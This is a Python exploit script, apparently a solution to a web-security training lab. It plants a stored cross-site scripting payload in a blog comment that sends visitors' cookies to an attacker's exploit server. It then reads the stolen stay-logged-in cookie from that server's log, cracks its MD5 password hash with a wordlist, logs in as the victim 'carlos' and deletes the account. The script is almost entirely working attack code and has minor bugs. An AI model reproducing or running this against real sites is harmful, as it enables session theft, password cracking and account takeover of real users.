import requests
import sys
from colorama import Fore, init
import hashlib
import urllib3
import re
import time
import base64
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
username = 'carlos'

def cookie(exploit_url, s):
    r = s.get(exploit_url+'/log', verify=False, proxies=proxies)
    stay_logged_in_pattern = r'stay-logged-in=([^&"]+ )'
    match = re.search(stay_logged_in_pattern, r.text ) 
    if match:
        return match.group(1)
    else:
        print(Fore.red + '[-] Unable to get the cookies')
    
def crack_the_password(exploit_url, s):
    time.sleep(1)
    cookies = cookie(exploit_url, s).strip(' ')
    decoded_cookie = base64.b64decode(cookies).decode('utf-8')  # Decoding with correct encoding
    print(Fore.GREEN + f'[+] Password: {decoded_cookie}\n'+Fore.YELLOW+'[+] You can crack the password hash online')
    ans = input(Fore.YELLOW + f'[!] OR, using a wordlist to crack it offline? [Y] or [N]: ')
    if ans.lower() == 'y':
        wordlist = input(Fore.MAGENTA+'[?] Enter the wordlist location>> '+Fore.RESET)
        if os.path.exists(wordlist):
            print(Fore.YELLOW + '[!] BruteForcing the password..')
            print(Fore.YELLOW + '[!] This may take some time to succeed..')
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
                passwords = file.readlines()
            for password in passwords:
                password = password.strip()  # Remove trailing newline characters
                hashed_password = hashlib.md5(password.encode()).hexdigest()
                session_data = f'{username}:{hashed_password}'  # Assuming username is defined somewhere
                hashed = base64.b64encode(session_data.encode()).decode()
                if decoded_cookie == hashed:
                    print(Fore.GREEN + f'[+] Carlos password is: {password}')
                    return password

        else:
            print(Fore.RED + f'[-] Wordlist file not found')
            return
    elif ans.lower() == 'n':
        print(Fore.MAGENTA + '[^-^] Thanks For using!')
        return
    else:
        print(Fore.RED + '[-] Invalid input')
        return

def exploit(url, exploit_url, s): 
    print(Fore.YELLOW + '[!] Sending the payload..')
    payload = f"<script>document.location = '{exploit_url+'/exploit'}' + document.cookie;</script>"
    data={'postId':1, 'comment':payload, 'name':'ans', 'email':'ans@ans.ca', 'website':'http://ans.com'}
    s.post(url + '/post/comment', data=data, verify=False, proxies=proxies)
    time.sleep(3)
    password = crack_the_password(exploit_url, s)
    if password:
        r = s.post(url+'/login', data={'username':username, 'password':password, 'stay-logged-in':'on'}, verify=False, proxies=proxies)
        if f'Your username is: {username}' in r.text:
            print(Fore.GREEN + '[+] Seccessfuly log in as Carlos')
            r = s.post(url+'/my-account/delete', data={'password':password}, verify=False, proxies=proxies)
            if 'Congratulations' in r.text:
                print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            else:
                print(Fore.RED+'[-] Not solved')
        else:
            print(Fore.RED+'[-] Unable to log in as Carlos')
    else:
        print(Fore.RED+'[-] Password not found') 

def main():
    if len(sys.argv) != 3:
        print(Fore.YELLOW + '[-] Usage : %s <url> <exploit_url>' % sys.argv[0])
        sys.exit(-1)
        
    s = requests.Session()
    url = sys.argv[1]
    exploit_url = sys.argv[2]
    exploit(url, exploit_url,s)

if __name__ == '__main__':
    main()
